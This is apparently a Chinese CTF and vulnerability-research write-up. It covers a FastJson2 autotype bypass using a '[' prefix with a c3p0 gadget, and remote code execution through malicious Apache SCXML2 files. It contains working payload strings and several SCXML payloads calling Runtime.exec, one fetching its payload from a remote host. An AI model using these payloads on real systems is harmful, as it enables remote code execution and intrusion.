考点：FastJson2反序列化，c3p0反序列化
FastJson2 Bypass惯例先审代码：
//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.app.controller;import com.alibaba.fastjson2.JSON;import com.alibaba.fastjson2.JSONReader;import com.alibaba.fastjson2.JSONReader.Feature;import com.app.bean.User;import java.io.FileOutputStream;import java.util.Base64;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.CookieValue;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;@Controllerpublic class TestController &#123;    public static String[] blacklist = new String[]&#123;&quot;ldap&quot;, &quot;rmi&quot;, &quot;dns&quot;, &quot;iiop&quot;&#125;;    public TestController() &#123;    &#125;    @RequestMapping(&#123;&quot;/&quot;&#125;)    public String index() &#123;        return &quot;redirect:/login&quot;;    &#125;    @RequestMapping(&#123;&quot;/login&quot;&#125;)    public String login(@RequestParam(value = &quot;username&quot;,required = false,defaultValue = &quot;&quot;) String username, @RequestParam(value = &quot;password&quot;,required = false,defaultValue = &quot;&quot;) String password) &#123;        if (username.length() != 0 &amp;&amp; password.length() != 0) &#123;            User user = new User();            if (username.equals(user.getUsername()) &amp;&amp; password.equals(user.getPassword())) &#123;                return &quot;user-profile&quot;;            &#125;        &#125;        return &quot;login&quot;;    &#125;    @RequestMapping(&#123;&quot;/userprofile&quot;&#125;)    public String userprofile(@CookieValue(value = &quot;userinfo&quot;,defaultValue = &quot;&quot;,required = false) String userinfo, Model model) &#123;        if (userinfo.isEmpty()) &#123;            return &quot;login&quot;;        &#125; else &#123;            try &#123;                String decstr = new String(Base64.getDecoder().decode(userinfo));                String[] var4 = blacklist;                int var5 = var4.length;                for(int var6 = 0; var6 &lt; var5; ++var6) &#123;                    String black = var4[var6];                    if (decstr.contains(black)) &#123;                        model.addAttribute(&quot;msg&quot;, &quot;check &quot; + black);                        return &quot;error&quot;;                    &#125;                &#125;                User obj = (User)JSON.parse(decstr, new JSONReader.Feature[]&#123;Feature.SupportAutoType&#125;);                User user = new User();                if (obj.username.equals(user.getUsername()) &amp;&amp; obj.password.equals(user.getPassword())) &#123;                    return &quot;user-profile&quot;;                &#125; else &#123;                    model.addAttribute(&quot;msg&quot;, &quot;username or password error&quot;);                    return &quot;error&quot;;                &#125;            &#125; catch (Exception var8) &#123;                model.addAttribute(&quot;msg&quot;, &quot;cookie is error&quot;);                return &quot;error&quot;;            &#125;        &#125;    &#125;    @RequestMapping(&#123;&quot;/logoapi&quot;&#125;)    public String logoapi(@RequestParam(value = &quot;logostr&quot;,defaultValue = &quot;&quot;,required = false) String logostr, Model model) &#123;        if (logostr.isEmpty()) &#123;            model.addAttribute(&quot;msg&quot;, &quot;plz give me data&quot;);            return &quot;error&quot;;        &#125; else &#123;            try &#123;                byte[] decode = Base64.getDecoder().decode(logostr);                FileOutputStream fileOutputStream = new FileOutputStream(&quot;/tmp/logo.jpg&quot;);                fileOutputStream.write(decode);                fileOutputStream.close();                model.addAttribute(&quot;msg&quot;, &quot;logo set success&quot;);                return &quot;error&quot;;            &#125; catch (Exception var5) &#123;                model.addAttribute(&quot;msg&quot;, &quot;data is wrong&quot;);                return &quot;error&quot;;            &#125;        &#125;    &#125;&#125;
在这里其实是用到了FastJson的parse方法，那么方向思考往fastjson反序列化靠，先看看该题目的fastjson版本不看不知道，一看是fastjson2，以往我们的fastjson链子都是1.x的，然后我们也知道在1.4.x版本后加了一个checkAutotype用来判断是否可以被反序列化，那么这里就需要绕过了还有一个很有意思的点就是我们看到了依赖中是有c3p0的那么很明显就是用C3P0去打FastJson，先不急，我们用以往的payload调试一遍看看：
String poc = &quot;&#123;\n\t\&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,\n\t\&quot;userOverridesAsString\&quot;: \&quot;HexAsciiSerializedMap:&quot; + hexString + &quot;;\&quot;\n&#125;&quot;;
我们来跟一遍流程，断点就给在parse方法先进入parse里的readObject进行反序列化然后调用了autoTypeObjectReader = context.getObjectReaderAutoType(typeName, (Class)null);判断typeName调用了checkAutoType在里面对我们传入的typeName疯狂进行异或然后和hash黑名单里的值进行比较这里的denyhash黑名单就比较铸币了，设计者为了防止别人研究黑名单，所以换成了hashcode，但我想的是java里的类也没那么多，按照你的算法碰撞一遍不全都出来了，然后我github一搜还真是https://github.com/LeadroyaL/fastjson-blacklist然后发现C3P0的com.mechange被ban了，因此就得思考如何进行绕过，前几个版本有用到tips，就是加上[进行绕过，那么这里究竟可不可以呢？首先加上是可以绕过这里的checkAutoType的，但是之前版本对此的修复方式为抛出异常，我们看看loadClass的逻辑我们的类名传进来为[com.mchange.v2.c3p0.WrapperConnectionPoolDataSource，先判断classname的长度是不是大于192，如果是返回null，这里肯定不是，然后判断开头是否为[，如果是就用substring去除，这里我觉得好傻逼啊你在1.2.46的补丁里抛出异常了你为啥在fastjson2忘记了呢。。。。。
编写POC因此这一题的payload很简单有2种：
String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,[\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+Hex+&quot;\&quot;&#125;&quot;;String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,[\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+Hex+&quot;\&quot;]&#125;&quot;;
里面的Hex就是你Poc.ser的十六进制编码
 public static void unserialize(String exp) throws IOException, ClassNotFoundException &#123;        byte[] decode = Base64.getDecoder().decode(exp);        String Hex = bytesToHexString(decode,decode.length)+&quot;a&quot;;        System.out.println(Hex);    &#125;public static void main(String[] args) throws Exception&#123;        byte[] b = Files.readAllBytes(Paths.get(&quot;E:\\CTFLearning\\Java\\C3P0\\C3P0\\target\\classes\\poc.ser&quot;));        String s = Base64.getEncoder().encodeToString(b);        unserialize(s);    &#125;
然后这里有一个注意事项，就是你的HEX POC必须是偶数，否则会抛出一个异常因此在你的poc结尾加上一个字符，这里加了个a，然后即可RCE假如需要注内存马，直接把内存马的poc换上即可
POC流程分析惯例审POC，对FastJson熟悉一点的同学可能就知道，在调用parse的过程中是会调用任意类的setter方法的，因此这里结合c3p0可以达到反序列化这里的触发点在this.vcs.fireVetoableChange调用了firevetoablechange方法，跟进一下继续跟进继续跟进到这里经过evt.getNewValue方法获取了我们的十六进制字符串，然后调用了parseUserOverridesAsString在这里将十六进制字符串解码后，再变为bytes字节数组，跟进fromByteArray开始反序列化，调用 deserializeFromByteArray(var0)弹计算机了

前言一开始是看到ctfio上的这篇文章，感到比较好奇，因为挺新的https://www.ctfiot.com/96133.html经过我一晚上的玄学探究，和调试，最终发现这东西还挺好玩的妈的，并且发现POC不是一般的多，网上传出来的只有2种，我挖出来至少十种格式xml以上，但是没有完全统计出来，搞懂原理就知道一切了
简单复现Apache SCXML2 可以通过加载恶意xml文件实现RCE，这个XML的标签需要经过恶意的构造才行，接下来简单复现一下
import org.apache.commons.scxml2.SCXMLExecutor;import org.apache.commons.scxml2.io.SCXMLReader;import org.apache.commons.scxml2.model.ModelException;import org.apache.commons.scxml2.model.SCXML;import javax.xml.stream.XMLStreamException;import java.io.IOException;public class POC &#123;    public static void main(String[] args) throws ModelException, XMLStreamException, IOException &#123;        // engine to execute the scxml instance        SCXMLExecutor executor = new SCXMLExecutor();        // parse SCXML URL into SCXML model        SCXML scxml = SCXMLReader.read(&quot;http://127.0.0.1:8000/1.xml&quot;);        // set state machine (scxml instance) to execute        executor.setStateMachine(scxml);        executor.go();    &#125;&#125;
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;&lt;state id=&quot;run&quot;&gt;&lt;onentry&gt;&lt;script&gt;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&lt;/script&gt;&lt;/onentry&gt;&lt;/state&gt;&lt;/scxml&gt;
我们加载这个XML文件后，就可以RCE
细腻分析断点先先给在read方法出，我们看看流程进入read方法，又调用了另一个参数不同的read，在这里传入我们xml的path，并且初始化了一个Configuration将XML的路径和配置类都传入readInternal方法里，跟进然后初始化了一个URLresovler去读取XML，这边咱们的http服务就会接收到对应的请求，最后进入readDocument方法进行下一步读取获取xml的namespace和localname，最后进入readSCXML方法中进行更深次的读取，这里就是重点了这里会获取几个标签，可以看到包括我们payload里的state标签，由于最外层是state，因此进入readstate方法第二层标签是onentry，所以进入了readOnEntry方法进入readExecutableContext方法，接下来也是重点第三层是script，所以读取script标签在这里设置了body体，也就是恶意的payload，最后进入addAction方法，随之就完成了这一系列的读取和添加，退回readOnEntry最后添加进去后，进入POC中的第二个方法，setStateMachine省去一些跟进，直接到getGlobalContext(),在这里获取一下globalcontext随之退回setStateMaching，给evaluator属性赋值为刚刚上述流程得到的evaluator随之进入最后一个步骤，go方法进入firststep方法，这里的exctx储存着上述得到的所有东西进入fiststep方法先初始化，然后通过executeGloablScript方法执行globalscript，由于我们这次payload最外层是state不是script，所以没用先进入getStateMachine方法这里面放着我们的payload，然后退出去，进入getInitialTransition方法这里面也放着payload，退出去，然后add进了一个hashmap，随后进入microStep最后进入里面的executeTransitionContent(exctx, step)执行命令通过不断的迭代取出step里面的值，但是由于这次咱们的标签里没有Transition所以取不出什么东西，不会执行命令进入enterStates方法获取第二层标签onentry后又进入executecontent方法首先获取一个迭代器，里面再往深一层就是script标签进入getActionExecutionContext()方法，获取可执行的content，终于到最后一步了，随后进入excute方法最终执行命令在这里获取了script标签，调用evalScript执行命令
思考其他payload在这上述过程中，最后一步咱们调用的是不是evalScript，方法，我们看看还有啥其他类似的？那也就是说明Cond、Location、Assign、Script起码都是可以的，其实Location、Assign最终实际调用的是eval，都是获取expr属性会获取expr属性，然后eval就是执行expr属性的然后这些payload的根源都是从哪儿起来的呢？答案是read方法，记得read方法里的这一步吗？会获取以下5个最外层标签，那我们就分析一下，这五个标签有啥可能性，就不调试了直接说简单说分析最终可用来执行命令的属性或者是标签为

script标签
expr属性
cond属性
assign标签的expr属性（归根还是expr属性)

这里就直接放一些其他payload了
&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot;&gt;    &lt;datamodel&gt;        &lt;data id=&quot;flag&quot; expr=&quot;&#x27;&#x27;.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)&quot;&gt;&lt;/data&gt;    &lt;/datamodel&gt;&lt;/scxml&gt;
&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot;&gt;    &lt;parallel&gt;        &lt;invoke src=&quot;test&quot; content=&quot;test&quot; id=&quot;flag&quot;&gt;            &lt;param name=&quot;flag&quot; expr=&quot;&#x27;&#x27;.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)&quot;&gt;&lt;/param&gt;        &lt;/invoke&gt;    &lt;/parallel&gt;&lt;/scxml&gt;
&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot;&gt;    &lt;state&gt;        &lt;history src=&quot;test&quot; content=&quot;test&quot; id=&quot;flag&quot;&gt;              &lt;transition name=&quot;flag&quot; cond=&quot;&#x27;&#x27;.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)&quot;&gt;&lt;/transition&gt;        &lt;/history&gt;    &lt;/state&gt;&lt;/scxml&gt;
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;    &lt;state id=&quot;run&quot;&gt;        &lt;onentry&gt;            &lt;if cond=&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;&gt;&lt;/if&gt;        &lt;/onentry&gt;    &lt;/state&gt;&lt;/scxml&gt;
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;&lt;state id=&quot;run&quot;&gt;&lt;invoke src=&quot;http://vps/2.xml&quot;/&gt;&lt;!--2.xml放上面随便一个payload都可以 --&gt;&lt;/state&gt;&lt;/scxml&gt;
其他还有很多payload，不想一个个测，直接说一下原理，去寻找哪里调用了setExpr或者setCond即可onEntry的替代品可以是onexit，然后最后可以附带expr属性的标签可以是location、assign，还有一些带cond的也是，就在上面的SCXMLReader方法里面一个个找，就五个最外层的大标签

